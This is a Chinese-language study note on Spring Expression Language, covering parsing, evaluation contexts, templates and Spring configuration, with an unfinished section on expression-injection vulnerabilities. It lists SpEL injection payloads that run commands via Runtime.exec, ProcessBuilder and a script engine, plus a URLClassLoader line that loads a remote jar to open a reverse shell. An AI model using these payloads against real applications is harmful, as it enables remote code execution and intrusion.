### SpEL表达式的基本使用

#### 简介

* Spring表达式语言（简称 **SpEL**，全称**Spring Expression Language**）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。
* SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。

#### Spel实现RCE

**基本使用：**

```java
ExpressionParser parser = new SpelExpressionParser();//创建解析器
Expression exp = parser.parseExpression("'Hello World'.concat('!')");//解析表达式
System.out.println( exp.getValue() );//取值，Hello World！
```



**自定义注册加载变量：**

```java
public class Spel {
    public String name = "何止";
    public static void main(String[] args) {
        Spel user = new Spel();
        StandardEvaluationContext context=new StandardEvaluationContext();
        context.setVariable("user",user);//通过StandardEvaluationContext注册自定义变量
        SpelExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression expression = parser.parseExpression("#user.name");//解析表达式
        System.out.println( expression.getValue(context).toString() );//取值,输出何止
    }
}
```



**调用命令执行方法：**

```java
String cmdStr = "new java.lang.ProcessBuilder(\"calc\").start()"; // java.lang下的类可以省略包名 
ExpressionParser parser = new SpelExpressionParser();//创建解析器
Expression exp = parser.parseExpression(cmdStr);//解析表达式
System.out.println( exp.getValue() );//弹出计算器
```

```java
//  SpEL、OGNL、MVEL等表达式均设计为在访问静态类时，使用T()显示表明这是一个静态类
String cmdStr = "T(java.lang.Runtime).getRuntime().exec(\"open /System/Applications/Calculator.app\")";
```

```java
String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")";  // 利用JavaScript引擎，这里JavaScript可替换为nashorn
```

**通过类加载器加载class实现RCE：**

```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8999/Exp.jar")}).loadClass("Exp").getConstructors()[0].newInstance("127.0.0.1:2333") //反弹shell
```

```java
"T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"calc\")";
"T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.ProcessBuilder\").getConstructors()[1].newInstance(new String[]{\"calc\"}).start()";
// 这里得先获取AppClassLoader，可以通过其他类获取T(org.springframework.expression.Expression).getClass().getClassLoader()
```

#### 上下文环境

从前面自定义注册加载变量的代码中可以看出，SpEL表达式是由一个上下文环境的概念的，可以在上下文环境中注册变量、对象和方法，例子如下

* 这里有点像ONGL表达式

```java
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext context = new StandardEvaluationContext("rui0");
context.setVariable("variable", "ruilin");
String result1 = parser.parseExpression("#variable").getValue(context, String.class);
System.out.println(result1);
 
String result2 = parser.parseExpression("#root").getValue(context, String.class);
System.out.println(result2);
String result3 = parser.parseExpression("#this").getValue(context, String.class);
System.out.println(result3);
```

```java
public class A {
    String name;
 
    public String getName() {
        return name;
    }
 
    public void setName(String name) {
        this.name = name;
    }
 
    public A(String name) {
        this.name = name;
    }
}
```

```java
A a=new A("ruilin");
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression("name");
EvaluationContext context = new StandardEvaluationContext(a);
String name = (String) exp.getValue(context);
System.out.println(name);
exp.setValue(context,"ruilin setValue");
name = (String) exp.getValue(context);
System.out.println(name);
System.out.println(a.getName())
```

```java

public abstract class StringUtils {
 
  public static String reverseString(String input) {
    StringBuilder backwards = new StringBuilder();
    for (int i = 0; i < input.length(); i++) 
      backwards.append(input.charAt(input.length() - 1 - i));
    }
    return backwards.toString();
  }
}
```

```java
ExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext context = new StandardEvaluationContext();
context.registerFunction("reverseString", 
                         StringUtils.class.getDeclaredMethod("reverseString", 
                                                             new Class[] { String.class }));
String helloWorldReversed = 
          parser.parseExpression("#reverseString('hello')").getValue(context, String.class)
```

##### SimpleEvaluationContext和StandardEvaluationContext

* SimpleEvaluationContext可以防御表达式注入

#### 模板表达式

```java
public class TemplateParserContext implements ParserContext {

  public String getExpressionPrefix() {
    return "#{";
  }

  public String getExpressionSuffix() {
    return "}";
  }

  public boolean isTemplate() {
    return true;
  }
}
```

```java
String randomPhrase =
   parser.parseExpression("random number is #{T(java.lang.Math).random()}",
                          new TemplateParserContext()).getValue(String.class);
```

#### 在Spring中的使用

* 基于注解的使用

```java
public class EmailSender {
    @Value("${spring.mail.username}")
    private String mailUsername;
    @Value("#{ systemProperties['user.region'] }")    
    private String defaultLocale;
    //...
}
```

* 配置文件

```xml
<bean id="numberGuess" class="org.spring.samples.NumberGuess">
    <property name="randomNumber" value="#{ T(java.lang.Math).random() * 100.0 }"/>
    <!-- other properties -->
</bean>
```

| 特性     | $                      | #                            |
| -------- | ---------------------- | ---------------------------- |
| 作用     | 属性占位符，解析配置值 | SpEL 表达式，动态计算值      |
| 解析时机 | 应用上下文加载时       | 方法调用或运行时             |
| 典型场景 | 配置文件值注入         | 表达式校验、条件判断等       |
| 访问范围 | 配置文件中的键值对     | Bean、方法参数、上下文变量等 |

### SpEL表达式的漏洞触发

#### 可控属性

#### 双重SpEL表达式

```xml
<nxu:set var="directoryNameForPopup"
    value="#{request.getParameter('directoryNameForPopup')}"
    cache="true">
```

### SpEL表达式的常见利用语句

### SpEL相关漏洞分析

### SpEL表达式注入审计